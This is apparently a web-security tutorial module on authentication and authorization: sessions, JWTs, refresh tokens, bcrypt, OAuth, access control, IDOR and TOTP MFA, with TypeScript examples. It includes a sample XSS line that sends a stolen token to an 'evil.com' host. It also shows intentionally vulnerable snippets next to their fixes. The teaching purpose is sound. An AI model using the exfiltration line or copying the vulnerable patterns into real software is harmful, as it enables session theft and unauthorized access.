# 🔐 Module 04: Authentication & Authorization

**Difficulty:** 🟢 Fundamentals → 🟡 Intermediate  
**Time:** 90-120 minutes

---

## What You'll Learn

- Authentication vs Authorization (they're different!)
- Session-based auth (traditional)
- Token-based auth (JWTs)
- Refresh tokens
- OAuth 2.0 (conceptual)
- Common authentication vulnerabilities
- How NOT to roll your own auth

---

## Authentication vs Authorization

### Definitions

**Authentication (AuthN):** *Who are you?*

- Verifying identity
- "Logging in"
- Proving you are who you claim to be

**Authorization (AuthZ):** *What can you do?*

- Verifying permissions
- "Access control"
- Determining what actions you're allowed to perform

---

### Example

```typescript
// Authentication: Verify user
const user = await authenticateUser(username, password);
if (!user) {
  return res.status(401).json({ error: 'Invalid credentials' });
}

// Authorization: Check permissions
if (!user.hasRole('admin')) {
  return res.status(403).json({ error: 'Forbidden' });
}
```

---

### Status Codes

| Code | Meaning | When to Use |
|------|---------|-------------|
| **401 Unauthorized** | Authentication failed | User not logged in, invalid credentials |
| **403 Forbidden** | Authorization failed | User is logged in but lacks permission |

**Common mistake:** Returning 403 when the user isn't even logged in. Use 401.

---

## Session-Based Authentication

### How It Works

```mermaid
sequenceDiagram
    participant Browser
    participant Server
    participant Database
    participant SessionStore
    
    Browser->>Server: POST /login (credentials)
    Server->>Database: Verify credentials
    Database-->>Server: User valid
    Server->>SessionStore: Create session
    SessionStore-->>Server: Session ID
    Server-->>Browser: Set-Cookie: session=abc123
    
    Browser->>Server: GET /profile (Cookie: session=abc123)
    Server->>SessionStore: Lookup session
    SessionStore-->>Server: User ID, roles
    Server->>Database: Fetch user data
    Database-->>Server: User data
    Server-->>Browser: Profile data
```

---

### Implementation Example

```typescript
import session from 'express-session';
import RedisStore from 'connect-redis';
import redis from 'redis';

const redisClient = redis.createClient();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 3600000  // 1 hour
  }
}));

// Login endpoint
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await db.users.findByUsername(username);
  if (!user || !bcrypt.compareSync(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Store user info in session
  req.session.userId = user.id;
  req.session.roles = user.roles;
  
  res.json({ success: true });
});

// Protected endpoint
app.get('/profile', requireAuth, async (req, res) => {
  const user = await db.users.findById(req.session.userId);
  res.json({ user });
});

// Middleware
function requireAuth(req, res, next) {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  next();
}
```

---

### Session Security

#### 1. Session Fixation

**Attack:** Attacker sets a known session ID for the victim.

```
1. Attacker gets session ID: abc123
2. Attacker tricks victim into using that session ID
3. Victim logs in with session ID abc123
4. Attacker uses session ID abc123 (now authenticated as victim!)
```

**Defense: Regenerate session ID on login**

```typescript
app.post('/login', async (req, res) => {
  // Verify credentials...
  
  // Regenerate session ID
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'Session error' });
    
    req.session.userId = user.id;
    res.json({ success: true });
  });
});
```

---

#### 2. Session Hijacking

**Attack:** Attacker steals victim's session ID.

**Vectors:**
- XSS (JavaScript reads cookie)
- Network sniffing (HTTP not HTTPS)
- Physical access (shared computer)

**Defenses:**
- `HttpOnly` cookie (prevents XSS)
- `Secure` cookie (HTTPS only)
- Session timeout
- Logout functionality
- IP address validation (limited effectiveness)

---

## Token-Based Authentication (JWT)

### What Is a JWT?

**JSON Web Token** — a self-contained, signed token.

**Structure:**
```
header.payload.signature
```

**Example:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Decoded:**
```json
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}

// Signature (verifies integrity)
```

---

### JWT Flow

```mermaid
sequenceDiagram
    participant Client
    participant Server
    participant Database
    
    Client->>Server: POST /login (credentials)
    Server->>Database: Verify credentials
    Database-->>Server: User valid
    Server->>Server: Generate JWT
    Server-->>Client: { token: "eyJhbGc..." }
    
    Client->>Client: Store token (localStorage)
    
    Client->>Server: GET /profile<br/>Authorization: Bearer eyJhbGc...
    Server->>Server: Verify JWT signature
    Server->>Server: Extract user ID from token
    Server->>Database: Fetch user data
    Database-->>Server: User data
    Server-->>Client: Profile data
```

---

### JWT Implementation

```typescript
import jwt from 'jsonwebtoken';

const JWT_SECRET = process.env.JWT_SECRET;
const JWT_EXPIRY = '1h';

// Login endpoint
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await db.users.findByUsername(username);
  if (!user || !bcrypt.compareSync(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Generate JWT
  const token = jwt.sign(
    { 
      userId: user.id, 
      roles: user.roles 
    },
    JWT_SECRET,
    { expiresIn: JWT_EXPIRY }
  );
  
  res.json({ token });
});

// Protected endpoint
app.get('/profile', requireAuth, async (req, res) => {
  const user = await db.users.findById(req.userId);
  res.json({ user });
});

// Middleware
function requireAuth(req, res, next) {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  const token = authHeader.slice(7);  // Remove "Bearer "
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.userId = decoded.userId;
    req.roles = decoded.roles;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}
```

---

### Sessions vs JWTs

| Feature | Sessions | JWTs |
|---------|----------|------|
| **Storage** | Server-side | Client-side |
| **Scalability** | Requires shared session store | Stateless (easily scalable) |
| **Revocation** | Easy (delete session) | Hard (need blacklist or short expiry) |
| **Size** | Small (just session ID) | Large (entire payload) |
| **Security** | Server controls everything | Client stores token (XSS risk) |

---

### JWT Security Pitfalls

#### 1. Weak Secret

```typescript
// BAD
const JWT_SECRET = 'secret';

// GOOD
const JWT_SECRET = process.env.JWT_SECRET;  // 256+ bit random string
```

**How to generate:**
```bash
openssl rand -hex 32
```

---

#### 2. Algorithm Confusion

**Attack:** Attacker changes `alg: HS256` to `alg: none`.

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

**Defense: Explicitly specify algorithm**

```typescript
jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] });
```

---

#### 3. Storing JWTs in LocalStorage

```javascript
// VULNERABLE TO XSS
localStorage.setItem('token', token);

// If XSS exists:
const stolen = localStorage.getItem('token');
fetch('https://evil.com/steal?token=' + stolen);
```

**Better: Use HttpOnly cookies (if possible)**

```typescript
res.cookie('token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});
```

But this reintroduces CSRF concerns. Use CSRF tokens.

---

#### 4. Sensitive Data in JWT

```typescript
// BAD: JWT payload is NOT encrypted, only encoded
const token = jwt.sign({
  userId: user.id,
  email: user.email,
  ssn: user.ssn  // ← VISIBLE TO ANYONE!
}, JWT_SECRET);
```

**Anyone can decode the JWT:**
```bash
echo "eyJhbGc..." | base64 -d
```

**Rule: Never put sensitive data in JWTs.**

---

#### 5. No Expiration

```typescript
// BAD: Token never expires
const token = jwt.sign({ userId: user.id }, JWT_SECRET);

// GOOD: Short expiration
const token = jwt.sign({ userId: user.id }, JWT_SECRET, { expiresIn: '15m' });
```

---

## Refresh Tokens

### The Problem

- Short-lived access tokens are secure (limit damage if stolen)
- But requiring frequent re-authentication is bad UX

### The Solution: Refresh Tokens

```mermaid
sequenceDiagram
    participant Client
    participant Server
    participant Database
    
    Client->>Server: POST /login (credentials)
    Server-->>Client: Access token (15m)<br/>Refresh token (7d)
    
    Note over Client: 15 minutes pass
    
    Client->>Server: GET /api/data<br/>Auth: Bearer <expired-token>
    Server-->>Client: 401 Token expired
    
    Client->>Server: POST /refresh<br/>{ refreshToken }
    Server->>Database: Validate refresh token
    Database-->>Server: Valid
    Server-->>Client: New access token (15m)
    
    Client->>Server: GET /api/data<br/>Auth: Bearer <new-token>
    Server-->>Client: Data
```

---

### Implementation

```typescript
import crypto from 'crypto';

// Login
app.post('/login', async (req, res) => {
  // Verify credentials...
  
  // Generate tokens
  const accessToken = jwt.sign(
    { userId: user.id, roles: user.roles },
    JWT_SECRET,
    { expiresIn: '15m' }
  );
  
  const refreshToken = crypto.randomBytes(64).toString('hex');
  
  // Store refresh token in database
  await db.refreshTokens.create({
    token: refreshToken,
    userId: user.id,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)  // 7 days
  });
  
  res.json({ accessToken, refreshToken });
});

// Refresh
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  
  const tokenRecord = await db.refreshTokens.findOne({
    where: { token: refreshToken }
  });
  
  if (!tokenRecord || tokenRecord.expiresAt < new Date()) {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }
  
  // Generate new access token
  const accessToken = jwt.sign(
    { userId: tokenRecord.userId },
    JWT_SECRET,
    { expiresIn: '15m' }
  );
  
  res.json({ accessToken });
});

// Logout (revoke refresh token)
app.post('/logout', async (req, res) => {
  const { refreshToken } = req.body;
  
  await db.refreshTokens.destroy({
    where: { token: refreshToken }
  });
  
  res.json({ success: true });
});
```

---

## Password Storage

### ❌ Never Do This

```typescript
// PLAIN TEXT (catastrophic)
await db.users.create({
  username,
  password  // ← NEVER!
});

// MD5 or SHA-1 (broken)
const hash = crypto.createHash('md5').update(password).digest('hex');

// SHA-256 without salt (rainbow table attack)
const hash = crypto.createHash('sha256').update(password).digest('hex');
```

---

### ✅ Use bcrypt (or argon2)

```typescript
import bcrypt from 'bcrypt';

const SALT_ROUNDS = 12;  // Higher = slower (more secure, but slower)

// Hashing
const passwordHash = bcrypt.hashSync(password, SALT_ROUNDS);
await db.users.create({ username, passwordHash });

// Verification
const user = await db.users.findByUsername(username);
const isValid = bcrypt.compareSync(password, user.passwordHash);
```

**Why bcrypt?**
- Slow by design (thwarts brute force)
- Automatically includes salt
- Time-tested and widely used

---

## OAuth 2.0 (Conceptual)

### What Is OAuth?

**OAuth 2.0 is a delegation protocol.**

**Use case:** "Let App X access my Google Drive without giving it my Google password."

---

### OAuth Flow (Authorization Code)

```mermaid
sequenceDiagram
    participant User
    participant App
    participant Google
    
    User->>App: Click "Login with Google"
    App->>Google: Redirect to Google OAuth
    User->>Google: Login and authorize app
    Google-->>App: Authorization code
    App->>Google: Exchange code for access token
    Google-->>App: Access token
    App->>Google: Use token to access user's data
    Google-->>App: User data
```

---

### Common OAuth Mistakes

#### 1. No `state` Parameter (CSRF)

```typescript
// VULNERABLE
const authUrl = `https://oauth.example.com/authorize?client_id=abc&redirect_uri=https://app.com/callback`;

// Attacker can initiate OAuth and trick victim into completing it
```

**Fix: Use `state` parameter**

```typescript
const state = crypto.randomBytes(16).toString('hex');
req.session.oauthState = state;

const authUrl = `https://oauth.example.com/authorize?client_id=abc&redirect_uri=https://app.com/callback&state=${state}`;

// In callback:
if (req.query.state !== req.session.oauthState) {
  return res.status(400).json({ error: 'Invalid state' });
}
```

---

#### 2. Open Redirect

```typescript
// VULNERABLE
app.get('/callback', (req, res) => {
  const { code, redirect_uri } = req.query;
  
  // Exchange code for token...
  
  res.redirect(redirect_uri);  // ← Attacker-controlled!
});
```

**Fix: Validate redirect_uri**

```typescript
const allowedRedirects = ['https://app.com/dashboard', 'https://app.com/profile'];

if (!allowedRedirects.includes(redirect_uri)) {
  return res.status(400).json({ error: 'Invalid redirect' });
}
```

---

## Authorization Patterns

### Role-Based Access Control (RBAC)

```typescript
// Roles
const roles = {
  admin: ['read', 'write', 'delete', 'manage_users'],
  editor: ['read', 'write'],
  viewer: ['read']
};

// Middleware
function requireRole(requiredRole) {
  return (req, res, next) => {
    if (!req.user.roles.includes(requiredRole)) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    next();
  };
}

// Usage
app.delete('/api/users/:id', requireAuth, requireRole('admin'), async (req, res) => {
  // Delete user...
});
```

---

### Attribute-Based Access Control (ABAC)

**More flexible: decisions based on attributes.**

```typescript
function canEditPost(user, post) {
  // Owner can edit
  if (post.authorId === user.id) return true;
  
  // Admin can edit
  if (user.roles.includes('admin')) return true;
  
  // Editor can edit if post is draft
  if (user.roles.includes('editor') && post.status === 'draft') return true;
  
  return false;
}

app.put('/api/posts/:id', requireAuth, async (req, res) => {
  const post = await db.posts.findById(req.params.id);
  
  if (!canEditPost(req.user, post)) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  // Update post...
});
```

---

### Insecure Direct Object Reference (IDOR)

**Common vulnerability: trusting client-provided IDs without authorization.**

```typescript
// VULNERABLE
app.get('/api/documents/:id', requireAuth, async (req, res) => {
  const doc = await db.documents.findById(req.params.id);
  res.json(doc);  // ← No ownership check!
});

// Attacker can access any document by changing :id
```

**Fix:**

```typescript
// SECURE
app.get('/api/documents/:id', requireAuth, async (req, res) => {
  const doc = await db.documents.findById(req.params.id);
  
  if (doc.ownerId !== req.user.id) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  res.json(doc);
});
```

---

## Multi-Factor Authentication (MFA)

### TOTP (Time-Based One-Time Password)

**How it works:**
1. Server generates secret
2. User scans QR code with authenticator app
3. App generates 6-digit codes every 30 seconds
4. User enters code to log in

```typescript
import speakeasy from 'speakeasy';
import QRCode from 'qrcode';

// Enable MFA
app.post('/api/mfa/enable', requireAuth, async (req, res) => {
  const secret = speakeasy.generateSecret({ name: 'MyApp' });
  
  await db.users.update(req.user.id, {
    mfaSecret: secret.base32,
    mfaEnabled: false  // Not enabled until verified
  });
  
  const qrCode = await QRCode.toDataURL(secret.otpauth_url);
  
  res.json({ qrCode, secret: secret.base32 });
});

// Verify and activate MFA
app.post('/api/mfa/verify', requireAuth, async (req, res) => {
  const { token } = req.body;
  const user = await db.users.findById(req.user.id);
  
  const verified = speakeasy.totp.verify({
    secret: user.mfaSecret,
    encoding: 'base32',
    token,
    window: 1
  });
  
  if (!verified) {
    return res.status(400).json({ error: 'Invalid token' });
  }
  
  await db.users.update(req.user.id, { mfaEnabled: true });
  res.json({ success: true });
});

// Login with MFA
app.post('/login', async (req, res) => {
  // Verify username/password...
  
  if (user.mfaEnabled) {
    return res.json({ requiresMfa: true, userId: user.id });
  }
  
  // Issue token...
});

app.post('/login/mfa', async (req, res) => {
  const { userId, token } = req.body;
  const user = await db.users.findById(userId);
  
  const verified = speakeasy.totp.verify({
    secret: user.mfaSecret,
    encoding: 'base32',
    token
  });
  
  if (!verified) {
    return res.status(401).json({ error: 'Invalid MFA token' });
  }
  
  // Issue JWT...
});
```

---

## Summary

1. **Authentication ≠ Authorization** — who you are vs what you can do
2. **Sessions** store state server-side, **JWTs** are stateless
3. **Refresh tokens** balance security and UX
4. **Never roll your own crypto** — use bcrypt for passwords
5. **OAuth** is for delegation, not authentication (technically)
6. **IDOR** is a common authz bug — always check ownership
7. **MFA** significantly increases security

---

## Exercises

### Exercise 1: Audit Your Auth
Review a project with authentication:
- How are passwords stored?
- Are sessions/tokens secure?
- Is there IDOR vulnerability?

### Exercise 2: Implement Refresh Tokens
Extend a JWT-based auth system with refresh tokens.

### Exercise 3: Test IDOR
1. Create two user accounts
2. Create a resource as user A
3. Try accessing it as user B (changing the ID in the request)
4. Does it work? If yes, you have IDOR.

---

## What's Next?

Now that you understand authentication and authorization, let's dive into the OWASP Top 10 vulnerabilities.

→ **Next: [Module 05: OWASP Top 10 (Developer Version)](../05-owasp-top-10/01-injection-attacks.md)**

---

## Further Reading

- [OWASP: Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [JWT.io](https://jwt.io/)
- [OAuth 2.0 Simplified](https://aaronparecki.com/oauth-2-simplified/)
